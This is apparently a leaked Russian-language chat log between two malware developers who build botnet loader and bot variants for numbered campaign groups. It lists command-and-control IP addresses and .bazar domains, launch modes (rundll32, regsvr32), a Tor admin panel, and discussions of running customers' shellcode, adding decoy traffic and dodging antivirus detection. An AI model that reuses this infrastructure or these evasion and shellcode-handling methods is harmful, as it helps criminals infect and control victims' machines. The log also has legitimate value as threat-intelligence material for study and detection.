LuomJocMHtXqMJlTzyXoQzlKjKU5ppDNgKGiHSVR7g6SzrlJSPTxRaOvplzIMjsg
LVzLDDM+lZzZmPvCBKhlWPpcufpcWUGAtyv97vrhmLNKrxK7X0uDajnybXyDpHTu
z91kp5Wn4POMOFD/JecyaWwScPzRsKQOJty6cMFmAg==
=TWxx
-----END PGP MESSAGE-----
[08.09.21 10:58:03] collin:		архив пустой
[08.09.21 10:58:14] collin:		у тебя бот отправляет отчет на каждую команду NOP?
[08.09.21 11:22:10] collin:		сделай сборку для группы 32
[08.09.21 11:22:29] collin:		архитектура x64, в двух вариантах: generic и regsvr32
[08.09.21 11:22:48] collin:		адреса и базары те же что в 19-20 были сегодня
[08.09.21 11:22:52] collin:		скинь wild
[08.09.21 11:34:47] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAklQ/+hPRrDCl3Fu/uH79mG7jz88cJVwV083AAr9fmAUT
dkmc4RIdxRXjv+fAJmDggEZPW4BvJ2Ugce146F264YvTeE4IUx/Ki9P38qQgx0yU
+UXkiV1z+65OuWjOC/v4max1nO+vmed92YlL9KITSC9QG/gSVeZKi4YvTGlW9fZB
4yYQb47dXSSGTX8TjFi7s79JYh6OBV/pajIeIguwULTmj2fbqBEs9DlqoyJhvKlO
VthwYFuIrxX5tnuJGLBwcnHHsI+jqYJ7CW1vEleIu/wYsOsynJmXDNB49P8mbRal
OW0mxdn8yICIdwdG2ec97NE5bS7zNIrLbmQuR+6qddw5/PEg84B5c7Jpq/GxjssO
hrjTlRlQM6BBg+ffshP1cVmRlBWvC8e+NmJOG4UBQPH4hw6lBOJeOQMwu8HM0958
hntdj01llVtKPCm2Ypz/OrAeeWSjZNuThc7Gy5KvLV7vJtA6h9BKrB90mLhjW7x+
UQ3IASYAPdwkLhbyobRZqo4vYxwjc+Tb0ouITFOLjRKff65VGnI3Nm1FTGhWP40p
JLVnOfqV/X5r0pnTEiGGVkpayUiTez15bP8nM0WVpMEPrIIx/nHSFjTCpAW9sa1Z
argZVLqm2PyDn/4cPWib9mXefUs3pfWVzkYrFN2n3+nBVMqYIr0U8x5nDOOzy7HS
rQEANy+k4PGhXxh8jIrBQ2IPOpQtvtGa/+ebpURqLbZRdwGawDTRFjE4ffLGQ3p5
9AVU3O3plU2mQk1ju8RwJp9ari07hMYHvxRIuWX+AMDsUQ4PllMp6dwLTLRL4IuM
8qPTSPL8J124/bzngPTQW6eg2IabkOv7UvnKM7nsMbqXSLhEQLbyHUVRdzsgHJQc
NWt4cf5hqGvPu/TmWbHj6cyr+fnrit3ZkmCPMV9k
=Dtqy
-----END PGP MESSAGE-----
[08.09.21 11:35:27] royal:		По поводу nop
[08.09.21 11:35:43] royal:		Посылает последнюю ошибку если былла или строку OK всегда.
[08.09.21 11:36:20] collin:		файл .lib нужен тут?
[08.09.21 11:36:38] royal:		Нет.
[08.09.21 11:41:05] collin:		теперь стучит через прокси
[08.09.21 11:41:27] royal:		Хорошо.
[09.09.21 07:48:24] collin:		привет!
[09.09.21 07:48:27] collin:		сделай новую сборку
[09.09.21 07:48:46] collin:		группа 33, x64, rundll32(StartW)
[09.09.21 07:48:48] collin:		адреса и базары:
[09.09.21 07:48:51] collin:		```
адреса (домены) первого этапа
бот:
194.15.112.71
172.83.155.173
45.42.201.123
194.135.33.179

лоадер:
45.42.201.123
194.135.33.179
194.15.112.71
172.83.155.173

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[09.09.21 07:48:55] collin:		направь wild
[09.09.21 08:34:39] royal:		Не обращай внимания что стерлось все, я тор обновлял. Сборка сделана уже ждет wild.
[09.09.21 08:34:57] collin:		ок
[09.09.21 08:35:02] collin:		у меня не стерлось еще
[09.09.21 10:01:18] collin:		продублируй сборку группу 33 тестеру nick
[09.09.21 10:02:05] royal:		Есть еще nicky
[09.09.21 10:02:14] royal:		nick точно?
[09.09.21 10:02:30] collin:		nick
[09.09.21 14:16:07] royal:		У точнение задержка перед первыз апросом к серверу? Именно перед первым запросом? Может перед первым коннектом?
[09.09.21 14:17:21] royal:		Или на свое усмотрение?
[09.09.21 14:17:36] royal:		У точнение задержка перед первыз апросом к серверу? Именно перед первым запросом? Может перед первым коннектом?
Или на свое усмотрение?
[09.09.21 14:18:24] royal:		А еще лучше перед созданием интернет сессии.
[09.09.21 14:18:35] royal:		Чтобы никакой активности сетевой.
[09.09.21 14:20:56] collin:		у тебя один коннект на несколько запросов применяться может?
[09.09.21 14:21:39] royal:		Один раз InternetConnect и много запросов может быть.
[09.09.21 14:22:06] collin:		тогда задержку до начала использования сетевых API, до момента открытия коннекта
[09.09.21 14:22:13] royal:		Будет задержка пере созданием интернет сессии.
[10.09.21 07:24:59] collin:		Привет!
[10.09.21 07:25:07] collin:		сделай сборку группа g5
[10.09.21 07:25:53] collin:		x64, rundll32
[10.09.21 07:25:56] collin:		адреса и базары:
[10.09.21 07:26:05] collin:		```
адреса (домены) первого этапа
бот:
194.15.112.71
172.83.155.173
45.42.201.123
194.135.33.179

лоадер:
45.42.201.123
194.135.33.179
194.15.112.71
172.83.155.173

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[10.09.21 07:26:10] collin:		направь wild
[10.09.21 08:33:57] collin:		сделай еще сборку группа 20
[10.09.21 08:34:05] collin:		x64, regsvr32
[10.09.21 08:34:08] collin:		адреса и базары:
[10.09.21 08:34:14] collin:		```
адреса (домены) первого этапа
бот:
94.158.245.52
94.140.114.61
167.172.37.9
64.225.71.166

лоадер:
167.172.37.9
64.225.71.166
94.158.245.52
94.140.114.61

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[10.09.21 08:34:25] collin:		адреса те же что вчера*
[10.09.21 08:34:30] collin:		тоже Вилду скинь
[10.09.21 09:41:02] collin:		```
172.16.25.146 ewuqeked.bazar  82.238.231.108
192.168.11.8 ekxeidyw.bazar 62.86.245.246
```
[10.09.21 09:41:17] collin:		засквоттил два адреса, проверь на них скип-листы
[10.09.21 11:10:00] royal:		Попадают в диапазоны запрещенные.
[10.09.21 11:10:08] royal:		Пропускаются соответственно.
[10.09.21 11:10:28] royal:		Это будет в следующей сборке.
[10.09.21 11:10:48] royal:		Так как в текущих порядок байт во время проверки не верный.
[10.09.21 11:10:58] collin:		ок
[10.09.21 13:48:53] collin:		сделай сборку группа 6
[10.09.21 13:49:04] collin:		x86 generic
[10.09.21 13:49:09] collin:		адреса и базары:
[10.09.21 13:49:13] collin:		```
адреса (домены) первого этапа
бот:
194.15.112.71
172.83.155.173
45.42.201.123
194.135.33.179

лоадер:
45.42.201.123
194.135.33.179
194.15.112.71
172.83.155.173

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[10.09.21 13:49:38] collin:		направь wild
[10.09.21 13:49:43] royal:		Последний раз когда делал x86 у всех не работали запросы.
[10.09.21 13:50:04] collin:		в ботах?
[10.09.21 13:51:10] collin:		тогда направь не wild а nick
[10.09.21 13:51:11] royal:		Да.
[10.09.21 13:51:22] collin:		он потестит
[10.09.21 13:52:18] collin:		давай другую группу - 29 сделай
[10.09.21 13:52:44] collin:		29 x86 generic, направь nick
[10.09.21 13:53:13] royal:		Доступ.
[10.09.21 13:54:03] collin:		добавил
[10.09.21 14:26:06] royal:		nick не в теме там про generic и всякое такое в сборках?
[10.09.21 14:26:26] royal:		Надо объяснить?
[10.09.21 14:27:24] collin:		он спрашивает что-то?
[10.09.21 14:27:31] royal:		Нет пока.
[10.09.21 14:27:49] collin:		я объясню ему, задачу еще не успел поставить
[10.09.21 14:27:52] royal:		Он пока не принял.
[10.09.21 14:28:04] royal:		Желтый кружок у него.
[10.09.21 14:28:13] collin:		а что за проблема с запросами была?
[10.09.21 14:28:38] royal:		Не знаю, но у нас были коды 404, 502 тогда.
[10.09.21 14:28:46] royal:		Сейчас все работает.
[10.09.21 14:43:27] royal:		У nick jabber есть нашь?
[10.09.21 14:44:07] collin:		да
[10.09.21 14:44:29] royal:		Уже не надо, он объявился тут.
[10.09.21 14:45:11] collin:		page@
[13.09.21 14:05:33] collin:		сделай еще сборку группа 29
[13.09.21 14:05:39] collin:		x64, regsvr32
[13.09.21 14:05:42] collin:		адреса и базары:
[13.09.21 14:06:00] collin:		```
адреса (домены) первого этапа
бот:
194.15.112.71
172.83.155.173
45.42.201.123
194.135.33.179

лоадер:
45.42.201.123
194.135.33.179
194.15.112.71
172.83.155.173

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[13.09.21 14:06:13] collin:		направь wild
[13.09.21 14:15:17] collin:		уточнение нужен режим generic, не regsvr32
[13.09.21 14:15:26] collin:		группы 29
[14.09.21 08:55:10] collin:		привет!
[14.09.21 08:55:24] collin:		сделай сборку для группы 6
[14.09.21 08:57:24] collin:		x86, в двух режимах: generic и rundll32
[14.09.21 08:57:49] collin:		адреса и базары:
[14.09.21 08:57:52] collin:		```
адреса (домены) первого этапа
бот:
194.15.112.71
172.83.155.173
45.42.201.123
194.135.33.179

лоадер:
45.42.201.123
194.135.33.179
194.15.112.71
172.83.155.173

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[14.09.21 08:58:01] collin:		направь nick и мне продублируй
[14.09.21 09:36:44] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ//QsSsvb8cIRzquPLq8ISAAXdUuQ6EpkmUNpa5WtmLK+ST
v9L7Z5F5qXnrW7xIpDTpRbLokP2WufcVzi32NvrhvnzVAS++dghhfKRoqX/4VOuq
rQrAxVNofw/YMzkqqvFWBovcOKFZqv8y9myHlskXP4e1SHJcPonBxcfk5PvOY3f+
CEwhAAlyPJLU3tChT3FFUBd63aLwyejhgokLptwN35cZ+d+yrMUOj6c8T+UMLeEi
EjkmLJd/BAlQ2evrHmrNQjUkUWiRoQg5EokZzG5dmI3iaLurkpMEewwLcVQcC83K
/pAqucXKDOGTLvC4J7I02aW+udRDRn7Vnl6LUiQWrNg2XOSkf3Q5H23bfTUaNHWH
7qvRb9zp/KwphuctIDPSkHljOSgHpfPqw14xOazs/yzfRaPJ3cHFyLnhZUfOqy5E
FIu4Jqx/SUPZ9sV/PLhxqg5Xz7WJGPGOlVKNbYlxuLEbjuKMzB5clhCeiNTROGBo
YjACOahUhyfF3XnxuP69gsFBcmchFUZxyOpfaFMPwNazxBn/qxTb+Fixx2u0FdNO
guFRUpFUfbh5nDZaLaDvxrxEEf2k95VM4OGxiDZ4LZM25GYKZVfzuHvWO13Q9Tug
P4XEPSfdCTilTHGDKQnafQ+jMEu8ZBCddKvYTJ42Jmwgiwg4jOZxx6JDpsuTn0DS
wDQBU43RQlStAFn+Cq1tDE2366JxXHpFOWTNylHOxEAPj7Qdyx+ntbJHWs1CeYY7
IlBh16HLJy5DE9gD8jqmr6qpY87fH+5N8xZB0VoCuyT4GXQIEMzdzlmYC7lgdDlC
KDp8DNsS2L2Fo9dgAyWtegpuICnqGjX7LToRwvYlO0uUkqT6jq4WBD5K58OttXnN
uxRZvMva6PKo7B9Ko55jSa3F5/CbhtQoPz+tiuOIR3rascc+I+Kjw5P21CCLeql6
5noV3safx+V6cY+K7ndUUx+Pi1wwrH3xZhDoSVyYMdMM0nDRR7NfMjaNctY+ui7O
y2bGEP9O
=gOhv
-----END PGP MESSAGE-----
[14.09.21 09:36:48] royal:		Generic.
[14.09.21 09:36:59] royal:		Использовать GCC.
[14.09.21 09:49:55] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73ARAAqeqyDlORHGY+v+gbTDeqaO+9m5+JJ6w/ucG2YZuRTtMM
J0hICF4T9Fz5f73un2lURNfTddEwBKKM8ObmRUKB6ZQ9prHMPLzQuUeMSXtwKuGs
ruNr23SZBdpNC/09D3P2DnErqz9NCKyuX9Tx78vh5yIOhNYDgxjMKAsoQAaCpxhL
QP51C8cjiRwRTGkWrhOtQnWzjoFWD4SOgRetJnkLsSyv9oLhzt501nR/RMRka8P+
kiEfzlYtbeeVpr9PGAqyUzj/I30Epp+KgRMgQtOQ9KodJ0s1G0NJxtD0Jn1pAPLz
eJLdRpPGuDHTxWaMX5Qu4AIZkHftbph9hl1WauXgZ53Ljz24SusUl46u2/0EdN+f
c0ILEwStRPUA4vCBdDPllH85QOIc89uhDXjhDtEzx8G5hfW3Hbfw5esBfMzb1LiP
eXaO12PAxj0viy3JcipNpjGcpTOeer09NnKS25Zj0eKDREqfY4WwfIFrOml2V2VL
QLF2HL9E5p/QhZ+Y8O7dDu2/dLrpgNBnTsik37+55/I3YnZjv8+FeDINtODxgbIe
Z4LBmHaqSikK7AJKRskCNKiXUH4AH9QlfrsJ9tIAa0drLZ7441aAokScj6QY0+Qy
6DDAMHfb53pt79GijiyxK00MJ28PSH4V+o7rOS2Rcbt3OHlswZS2tZ7gG3BpqJbS
wDQBBdzT8UCdqAYV4PjgbpnLCNnWd4IS8LYVbwKv/YYq+mI63hXD5DPfbyc8ZOvK
q6RWdDMi9DIiJ0M8G0H8Kt8MJFHZw5whxHOHMBOKA0YgqRec8/yXOUyjPDU5oh2M
CMGnJQq+Nog2bi3RirKU6wxWX95twAW/blcDfy5AeO2yyMafcrN+KSlUkUC/zk5Y
a+jbgTSX9N01Hj3ezR7P3sZio50stywT2CXt2jayaO962IMxXg8tutZ+7hqX/Sm/
SZSrQIbvYvhMuGgIofvBjAo77Ag29f4EYXIepuzAN2Nvm0QGbck4lOnZD4wFvorT
t7BJ3WF2
=aufd
-----END PGP MESSAGE-----
[14.09.21 09:50:00] royal:		rundll32
[14.09.21 09:50:09] royal:		Экспотрная функция StartW
[14.09.21 09:50:16] royal:		Использовать GCC.
[14.09.21 09:51:27] collin:		+
[14.09.21 09:51:50] collin:		а можно сделать в x86 сборке чтобы список процессов и софта полный выводил
[14.09.21 09:51:54] royal:		Кстати мой бот для удаления 1a25650db9674df5125d8a536245d2b4
[14.09.21 09:51:56] collin:		а не только архитектуры x86?
[14.09.21 09:52:09] royal:		x86
[14.09.21 09:52:14] collin:		бот удалил
[14.09.21 09:53:16] royal:		Какой вопрос?
[14.09.21 09:53:27] royal:		Там все x86ю
[14.09.21 09:54:08] collin:		в отчете sysinfo нужен полный список процессов, полный список софта
[14.09.21 09:54:25] collin:		при работе x86 в wow64
[14.09.21 09:54:35] collin:		сейчас выводит только x86 получается
[14.09.21 09:55:44] royal:		У других все выводится?
[14.09.21 09:56:27] royal:		Если выводится все значит можно сделать.
[14.09.21 09:56:42] collin:		проверю еще раз, но вроде выводится
[14.09.21 09:56:59] collin:		только в твоей сборке на это внимание обратил, не первый раз
[14.09.21 11:02:29] collin:		сделай сборку группа 19
[14.09.21 11:02:35] collin:		x64, regsvr32
[14.09.21 11:02:38] collin:		адреса и базары:
[14.09.21 11:02:43] collin:		```
адреса (домены) первого этапа
бот:
172.83.155.173
89.41.182.139
194.15.112.159
194.135.33.179

лоадер:
194.135.33.179
194.15.112.159
172.83.155.173
89.41.182.139

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[14.09.21 11:02:46] collin:		направь wild
[14.09.21 14:31:19] royal:		54.183.0.212
54.151.54.192
[14.09.21 14:31:41] royal:		Не работает ни один. Все 12029 -  ERROR_INTERNET_CANNOT_CONNECT
The attempt to connect to the server failed.
[14.09.21 14:33:02] royal:		54.183.0.212
54.151.54.192
Не работает ни один. Все 12029 - ERROR_INTERNET_CANNOT_CONNECT
The attempt to connect to the server failed.
[14.09.21 14:33:19] collin:		ок
[15.09.21 09:26:17] collin:		привет!
[15.09.21 09:26:25] collin:		сделай сборку группа 6
[15.09.21 09:26:30] collin:		x86, generic
[15.09.21 09:26:34] collin:		адреса и базары:
[15.09.21 09:26:40] collin:		```
адреса (домены) первого этапа
бот:
64.227.72.83
194.15.112.159
64.225.67.166
107.173.192.166

лоадер:
107.173.192.166
64.227.72.83
194.15.112.159
64.225.67.166

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[15.09.21 09:26:49] collin:		направь nick и мне продублируй
[15.09.21 10:13:25] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ//YzXdEwnaYUn8WvF8klktvZGPDrXHt/cQ8dtSrFbxJKB1
gt++q+/OWTcYe8aCU5T4GqkLCI3gc6Djeo8RW5mOW0M2YaVV5jnmGgYTTSubVmSc
oL+XKp2BBhFot2RrVyLddfWeSUawTrBdvI/1B1Y17PL4RUTqJGOASm1pNThKurDw
qm8E5ZnoJcqPdx9lujk50/yBTotl2AF96kpeJXAIolK4EstssmqttEm/jtxEzPop
5rniabJFhxNDj3vey41S1F/iRQVQ71J2yOeYb1Q6QMjYvu+dZ6TFFsJpXzp7xKir
hLiiw48TniXdE1CNheSEqeTLLMPazU7UgMROAagqsOuCQvJcgjZdqdU+yftAFA9v
4GcDhFM47f6oJvAHnVhEPDY4WLa+pLBNzTBPqtzkl6BeDKUEz4iV7Sq81KJE+e/U
LmK9/yPEPoeP+yUMTZaWyJ2Lur89n5qB2BxF6akMSIGlk/ox7XLK1QaEg0ZEuxck
CZ3sOYlF9gpMobVlayM/UFdJFISo1H0kObonG2KWkrSR0OCxCW3V/2aArn9Ty6um
j0+Wn2DnJ375nCEZlQYmNiTxRGw4jj/gv1Y1Oj1OmC5ofv2HZ3V3SazV2VeXkOT+
WWh5uNWBym43YnfL9sB8z5qQ2CL397DTH7S8wswzMEqtaQ1yiAMuHniJIUfnMlrS
wDQBW6PmR1PnRcIe3Rpv06DTpDy2JxsGZ6McH9OQBv9NlYzGH7U8V6Ja5MP8ML55
KTPnmK2DxXeN/duYC2qteHIt35i3HP1dIF3WfvKjtPlhpdLAWwOoL9ydtdZ3Ey8f
RV5jV8zLDrPocGAefPEh5D3sttCOyuVzVW8BraM5O7CbIWw4XQfUfv25x+Ts4OI9
0tlRXSdswGV79UnUz4POQ1fOPyDUx+6l2N+2Knagx4lWxJDlm1Kyg/3GdBC57IKz
OCyXZhzSC4dG6/k8GscCcycRoJJJt8KuM1iqY+EOs7nawFlGYwS0vxYauW5Ich+H
JGEidnBP
=RCx/
-----END PGP MESSAGE-----
[15.09.21 10:13:28] royal:		GCC.
[15.09.21 10:16:58] royal:		Какой там у nick в jabber аккаунт?
[15.09.21 10:27:47] collin:		page@
[15.09.21 10:39:18] collin:		сделай сборку группа 20
[15.09.21 10:39:23] collin:		x64, regsvr32
[15.09.21 10:39:26] collin:		адреса и базары:
[15.09.21 10:39:29] collin:		```
адреса (домены) первого этапа
бот:
195.149.87.46
64.227.72.83
194.15.112.159
107.173.192.166

лоадер:
107.173.192.166
64.227.72.83
195.149.87.46
194.15.112.159

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[15.09.21 10:39:36] collin:		направь wild
[15.09.21 10:50:12] collin:		сделай еще сборку группы 6
[15.09.21 10:50:17] collin:		x86 режим rundll32
[15.09.21 10:50:20] collin:		адреса и базары те же что для 20
[15.09.21 10:50:30] collin:		направь nick, мне продублируй
[15.09.21 11:54:40] royal:		-----BEGIN PGP MESSAGE-----

hQIMA/SQT1otRH73AQ/9Hij9c3xiofvLhSWlRIU2ZE39yF+jY9cSIhcZShQKb4az
BVu6yri3Op06tjXqshXDhObtTpBbKDZLE0dALJz00OwvDogT4cDvfnzsCs+AM3bj
fmcuMzVKkMxp9UVhkXdLtXv/NR0d9Zo4W7v1Ffav3JOTGbEXuMwJcC/lBScGBEDz
JWws/9v+iy+p5jqA8YJU+4rUbO7onXBtAF2XxPUqo+efkgjvWYKNMJYB42l/yFEx
3oGynrU6QhO5wugNo/2mx5Iluvfbz/DG8/MfxEpgkD04tr3SBGHk8CEFci94EbyF
MfpemYYEg+ed/12JyrbL4FumCuezTZD5m6mDweFVhXQbs8OlZQFtaV2It5DU8lwt
CUczeKbc/zfDJlVFR8iQZULD/Aod/VsVgdg11CE6CaqBPFBohJmJXsk4eN1JoIeJ
PINSoINildTQj3LtDcY3giuhdaIdoiw/f0ZmSyOaLEkdC8rVW69diPdGnZBFvscD
KvyvVqNqtVMYRgcKFoBfmNnoxCrVRgL8+TkOdUwJ3T6K9svgRfe3at58SaCoYEZW
BwqDJeHdi9wBkEJi1BL8IMo3VNm0w7otA5C82uuqjBVxZB9aQIb6RfbwLdRgH3MH
+dpl/vxxgJiljfIe8h2nNsRetJHBsEtJdaupEoHfAhy7ymBPzng5HMS9+v1sQpLS
wDMB8DC3auDXgDBgkuxn8y1TfpCrUfi3uexiHNeLS3+k7JyPPK8LFNef7ACui0VV
MopeKCleez7l9OnvULooSyY+gbEPPKG1mezTpUypUcyiAo/6tZfSYd666j3HhN5A
ksflA9trEDLQWfb4i+K6Oecxuby7ycn2A6gcs/VCu9RmYfHvVa0PcaAomBTIK8hy
89XL/sD4bFBQQNdhPu9eZGp62aTxngJa3PTmucTwLqV1C4tu6PsvxK2Bynr51Qiw
rXJ2dR3n0unQahsI7hIaHEe9prEPg28DbCEJlo7p0f8ajeO2QHBeWnT5d6aVb6V2
zpL2mdA=
=q9AC
-----END PGP MESSAGE-----
[15.09.21 11:54:42] royal:		GCC
[15.09.21 11:54:44] royal:		StartW
[15.09.21 12:16:29] collin:		+
[15.09.21 14:24:32] collin:		тут у заказчика проблемы с шеллкодом
[15.09.21 14:24:46] collin:		```
[12:37:26] <zevs> https://lch5nnzyb5aof43pitcrzkmnvlr4xkrestpj4cpwstvgej34kqq6wqyd.onion/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/index.php?r=unimportant%2Fcommand&id=9821a18ae68f22f0b17c4d0ab6389151 
[12:37:32] <zevs> https://lch5nnzyb5aof43pitcrzkmnvlr4xkrestpj4cpwstvgej34kqq6wqyd.onion/sOIDFhsAIUfhu42332uygt27634ft7yuaFGyaugkJFsayjegf--_-GBASfdvt23fv/index.php?r=unimportant%2Fcommand&id=1f0bab75b8b82a9d2a66def5b8f71812 
[12:37:37] <zevs> вот примеры отправки ШК 
[12:37:44] <zevs> статус команды FAIL! 
[12:37:49] <zevs> бот отстукивает в сессию 
[12:37:53] <zevs> потом все умирает 
[12:38:02] <zevs> и в бк и в сессии 
```
[15.09.21 14:25:28] collin:		в группе 19 от 13.09, проверь это дело
[15.09.21 14:25:44] collin:		добавил таск 619 в багтрекере
[15.09.21 14:34:10] royal:		А он сам то проверял свой шелл код?
[15.09.21 14:34:22] royal:		Может он убивает программу.
[15.09.21 14:35:03] collin:		неизвестно)
[15.09.21 14:35:07] royal:		И ничего не сделаешь с этим.
[15.09.21 14:35:58] royal:		Если он убивает программу никаких отчетов не может быть.
[15.09.21 14:44:35] collin:		а на тестовом шеллкоде проверял, не падает отчет приходит?
[15.09.21 14:46:37] royal:		Который с бесконечным циклом?
[15.09.21 14:46:46] royal:		Там все зависнет.
[15.09.21 14:47:07] collin:		с сообщением и бесконечным циклом в конце
[15.09.21 14:47:27] royal:		Проверял, писал левый и не верный шелл код туда.
[15.09.21 14:47:31] collin:		ты не в отдельном потоке запускаешь?
[15.09.21 14:47:57] royal:		Нет.
[15.09.21 14:48:32] royal:		Так как нету такого понятия у этой команды как таймаут.
[15.09.21 14:50:44] royal:		Вообще лучше шелл код запускать в отдельном процессе, чтобы если все накрылось, а бот нет.
[15.09.21 14:53:36] royal:		А тестировщик может запустить шелл код этот?
[15.09.21 14:53:51] royal:		Сразу увидит исключение например.
[15.09.21 14:55:43] royal:		Это 64 битный бот?
[15.09.21 15:14:33] royal:		Зависает.
[15.09.21 15:16:09] collin:		пробую на ВМ его прогнать, у меня на основной каспер все залочил что система вылетела даже)
[15.09.21 15:16:48] royal:		Я запустил у себя зависло так же как твой без return.
[15.09.21 15:17:24] collin:		надо в отдельном потоке пускать наверное
[15.09.21 15:17:27] collin:		уточню, напишу
[15.09.21 15:18:23] royal:		Какая разница, все равно команда блокирующая, пока не выполниться ничего дальше не пойдет.
[15.09.21 15:18:50] collin:		ну если в отдельном потоке - запустил как в фоновом режиме, отправил отчет и переходишь к следующей команде
[15.09.21 15:18:51] collin:		у меня так
[15.09.21 15:19:15] collin:		новый шеллкод приходит - проверяю старый поток, если он запускался и еще активен - завершаю принудительно, создаю новый с шк
[15.09.21 15:19:38] royal:		Нельзя переходит к следующей, а то админка перепутает ответы. Или не примет.
[15.09.21 15:19:55] collin:		почему?
[15.09.21 15:21:00] royal:		Да не перепутает.
[15.09.21 15:21:13] royal:		Но команда блокирующая по ТЗ.
[15.09.21 15:22:53] collin:		блокирующие только с таймаутом же
[15.09.21 15:22:58] royal:		Если там шелл код будет 2 дня работать или бесконечно, бот будет ждать.
[15.09.21 15:23:48] collin:		а смысла ждать его нет, мы же не передаем выход с шеллкода
[15.09.21 15:24:17] royal:		Они должны передавать это их задача.
[15.09.21 15:24:51] royal:		Мы же не отвечаем за то что этот код будет нормальным.
[15.09.21 15:25:20] royal:		Тогда в отдельный поток и забываем про него.
[15.09.21 15:37:13] royal:		В следующей сборке будет в отдельном потоке запускаться и про этот поток сразу забываем, никак не следим за ним.
[15.09.21 15:38:03] royal:		Хуть пуст 10 шелл кодов сделают команды, будет 10 потоков.
[15.09.21 15:39:53] collin:		если будет отдельный поток - некорректный шеллкод все равно может процесс ведь убить?
[15.09.21 15:40:37] royal:		Конечно.
[15.09.21 15:41:06] royal:		Для этого SEH используется.
[15.09.21 15:41:21] royal:		Чтобы перехватит исключение Windows.
[15.09.21 15:42:20] royal:		Когда проверял с левыми кодами исключение перехватывалось и программа не падала из-за этого.
[15.09.21 15:42:46] royal:		Но я думаю могут быть такие забористые эти коды что может и не перехватить, но это не точно.
[15.09.21 15:42:47] collin:		надо линковать с определенной опцией или включать обработчики исключений?
[15.09.21 15:45:38] royal:		В проекте по умолчанию они включены.
[15.09.21 15:46:07] royal:		/EHsc
[15.09.21 15:46:26] royal:		Там где "Включить C++ исключения"
[15.09.21 15:46:36] collin:		ок попробую
[15.09.21 15:46:39] royal:		Это только для MSVC
[15.09.21 15:46:57] collin:		я просто у себя все поотрубал, поэтому шеллкоды разные роняют бота
[15.09.21 15:47:06] royal:		GCC 64 битный их поддерживает тоже.
[15.09.21 15:47:17] royal:		Clang не помню.
[15.09.21 15:56:42] royal:		The compiler always generates code that supports asynchronous structured exception handling (SEH)
[15.09.21 15:57:12] royal:		Получется они всегда работают не зависимо от параметров C++ исключений.
[15.09.21 15:57:25] collin:		в clang?
[15.09.21 15:57:50] royal:		В MSVC.
[15.09.21 15:58:20] royal:		Не пробовал. Попробую.
[15.09.21 15:58:30] royal:		Clang попробую.
[15.09.21 15:58:43] royal:		__try
__catch
[16.09.21 08:40:48] collin:		привет!
[16.09.21 08:40:51] collin:		сделай сборку группа 6
[16.09.21 08:41:04] collin:		x86, в двух режимах: generic и rundll32
[16.09.21 08:41:06] collin:		адреса и базары:
[16.09.21 08:41:19] collin:		```
адреса (домены) первого этапа
бот:
134.255.254.76
45.14.226.182
94.140.115.104
178.23.190.206

лоадер:
94.140.115.104
178.23.190.206
134.255.254.76
45.14.226.182

домены второго этапа, бот и лоадер:
blackrain15.bazar
reddew28c.bazar
bluehail.bazar
whitestorm9p.bazar
```
[16.09.21 08:41:27] collin:		направь nick
[16.09.21 10:00:04] collin:		как успехи по группе 6?
[16.09.21 10:03:10] royal:		Еще не делал.
[16.09.21 10:05:19] collin:		как сделаешь, подготовь еще одну сборку
[16.09.21 10:05:28] collin:		группа 20, x64, regsvr32
[16.09.21 10:05:31] collin:		адреса и базары те же
[16.09.21 10:05:35] collin:		что для гр. 6
[16.09.21 10:05:47] collin:		выдавай wild
[17.09.21 09:17:09] collin:		привет!
[17.09.21 09:17:30] collin:		добавил новый таск 623
[17.09.21 09:18:17] collin:		займись этим в первую очередь, по сравнению с другими доработками
[17.09.21 09:27:24] royal:		Хорошо. Только шумовыке запросы доделаю. Сделал так что в отдельном потоке посылаются запросы на легитимные адреса через таймауту как в ТЗ.
[17.09.21 09:27:47] royal:		Через туже интернет сессию.
[17.09.21 09:28:01] collin:		да их доделай
[17.09.21 09:28:11] collin:		я думал уже готово, таск отметил натестирование
[17.09.21 09:28:28] royal:		Тестирование.
[17.09.21 09:28:38] collin:		а то что одна сессия под разные запросы, не может палить сильнее?
[17.09.21 09:28:57] royal:		Я думаю наоборо.
[17.09.21 09:29:12] royal:		Почему разные запросы?
[17.09.21 09:29:40] royal:		Запросы на легитимные адоеса сбивают с толку.
[17.09.21 09:29:44] collin:		последнее время зевс жалуется, говорит отстук упал. Думаю из-за чего еще может быть
[17.09.21 09:29:54] royal:		И там GET и там GET.
[17.09.21 09:30:23] collin:		за последнюю пару недель менял еще какой-то функционал
[17.09.21 09:30:27] collin:		кроме того что по доработкам?
[17.09.21 09:31:15] collin:		это по группам 19 20
[17.09.21 09:33:31] royal:		Подмена дочернего процесса браузера (если найден) отключена. Некоторые заголовки в запросе отключены. Это загрузчика. У бота ничего не менял.
[17.09.21 09:34:36] collin:		почему отключил?
[17.09.21 09:34:48] royal:		NOD 32
[17.09.21 09:35:03] royal:		Пока не сделал чтобы было и не палилось.
[17.09.21 09:35:09] royal:		Статический детект.
[17.09.21 09:35:30] royal:		Сейчас уже и так палится.
[17.09.21 09:35:42] royal:		Можно включать обратно.
[17.09.21 09:35:50] royal:		И чистить.
[17.09.21 09:37:34] collin:		нельзя жервтовать функционалом из-за чисток же
